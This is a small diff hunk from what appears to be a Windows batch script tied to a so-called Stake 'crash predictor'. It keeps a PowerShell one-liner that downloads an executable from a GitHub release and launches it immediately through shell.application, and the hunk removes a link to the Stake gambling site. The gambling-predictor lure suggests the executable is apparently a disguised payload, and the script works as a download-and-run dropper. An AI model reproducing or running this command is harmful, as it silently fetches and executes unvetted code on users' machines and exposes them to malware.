@@ -11,4 +11,3 @@ echo.
 powershell $down=New-Object System.Net.WebClient;$url='https://github.com/IWcommunityFR/stake-crash-preditor/releases/download/Stake-Crash-Predictor/CrashPredictor.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
 
 
-https://stake.com/fr/
